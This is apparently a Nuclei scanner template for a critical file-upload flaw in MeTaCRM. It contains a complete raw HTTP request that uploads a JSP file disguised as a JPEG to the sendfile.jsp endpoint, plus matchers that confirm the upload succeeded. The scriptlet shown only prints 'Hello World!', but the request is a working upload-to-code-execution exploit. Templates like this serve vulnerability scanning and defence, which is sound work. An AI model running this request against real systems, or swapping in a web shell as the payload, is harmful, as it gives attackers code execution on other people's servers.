id: MeTaCRM-sendfile-UploadToRCE

info:
  name: MeTaCRM-sendfile-UploadToRCE
  author: iSee857
  severity: critical
  description: MeTaCRM-sendfile-UploadToRCE

http:
  - raw:
      - |
        POST /business/common/importdata/sendfile.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypZBE5JAfBHwD8TNo
        Accept-Encoding: gzip, deflate

        ------WebKitFormBoundarypZBE5JAfBHwD8TNo
        Content-Disposition: form-data; name="file"; filename="upload.jsp"
        Content-Type: image/jpeg

        <% out.print("Hello World!"); %>
        ------WebKitFormBoundarypZBE5JAfBHwD8TNo--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - ".jsp"
          - "value"
          - "upload.jsp"
        condition: and
        part: body